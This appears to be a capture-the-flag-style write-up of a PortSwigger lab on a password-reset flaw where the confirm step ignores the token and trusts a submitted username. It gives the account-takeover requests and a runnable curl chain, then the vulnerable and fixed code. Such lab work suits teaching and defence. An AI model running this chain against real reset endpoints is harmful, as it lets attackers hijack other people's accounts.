---
layout: post
title: "PortSwigger: Password Reset Broken Logic"
date: 2027-10-06 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, Authentication]
tags: [portswigger, authentication, password-reset, broken-authentication, account-takeover, cwe-640]
---

A password-reset token is supposed to be the one piece of proof that you control the mailbox. This lab emails you a token and then never checks it — the reset goes through with the token blanked out, and the account it resets is whatever username you put in the form. So you can take over `carlos` without ever seeing his token. ([CWE-640](https://cwe.mitre.org/data/definitions/640.html), Weak Password Recovery Mechanism.)

## Overview

The goal is to access `carlos`'s account. We have our own low-privilege account (`wiener:peter`) and the lab's email client. The reset flow is two steps: request a reset at `/forgot-password`, then follow the emailed link to a confirm form that sets a new password. The token is meant to bind that confirm step to the account it was issued for — but the server forgets to validate it.

## The technique

The confirm form carries four fields:

```
temp-forgot-password-token   (hidden — the secret from your email)
username                     (hidden — your account)
new-password-1
new-password-2
```

A correct implementation looks up the pending reset *by the token* and applies the new password to whatever account that token belongs to. This app instead trusts the `username` field from the request body and skips the token check entirely. The token only ever gated *clicking the email link* — it never gated the *confirm*. So we request a reset for our own account just to learn the field names, then submit the confirm with a blank token and the victim's username.

## Solution

**Step 1 — trigger a reset for our own account** to learn the flow:

```
POST /forgot-password
username=wiener
```

The reset link in the email client confirms the field names (`temp-forgot-password-token`, `username`, `new-password-1`, `new-password-2`).

**Step 2 — exploit.** Blank the token in both the URL query and the request body, and swap the username to `carlos`:

```
POST /forgot-password?temp-forgot-password-token=
temp-forgot-password-token=&username=carlos&new-password-1=hacked123&new-password-2=hacked123

→ 302    (the reset succeeded)
```

**Step 3 — log in as the victim** with the password we just set:

```
POST /login
username=carlos&password=hacked123

→ 302 Location: /my-account?id=carlos
```

The lab flips to **Solved** a few seconds after the login.

The whole thing as one runnable chain (replace `TARGET` with the lab host):

```bash
curl -sk -X POST "https://TARGET/forgot-password?temp-forgot-password-token=" \
  -d 'temp-forgot-password-token=&username=carlos&new-password-1=hacked123&new-password-2=hacked123' && \
curl -sk -c c.txt -X POST "https://TARGET/login" \
  -d 'username=carlos&password=hacked123' -o /dev/null -w '%{http_code}\n'
```

## Why it worked

The reset confirm trusts a body field for *which* account to change and never checks the token for *whether* the change is authorized:

```python
user = get_user(request.form['username'])          # attacker-controlled
user.set_password(request.form['new-password-1'])  # no token validation at all
```

The token proves a reset was *requested*, but it was only enforced when the email link was clicked — not on the request that actually mutates the password. With the check absent, a token is unnecessary: anyone can POST the confirm form for any username.

## Fix / defense

Validate the token on the confirm step and derive the target account *from the token*, never from the request body:

```python
reset = get_password_reset(request.form.get('temp-forgot-password-token'))
if not reset or reset.expired:
    abort(400)
get_user(reset.user_id).set_password(request.form['new-password-1'])
reset.invalidate()   # single-use
```

Rules for any reset flow: the token must be present, non-empty, unexpired, and single-use before any change is applied; the account to reset comes from the token record, not from a user-supplied `username`/`email`/`id`; and the token is invalidated the moment the reset succeeds.
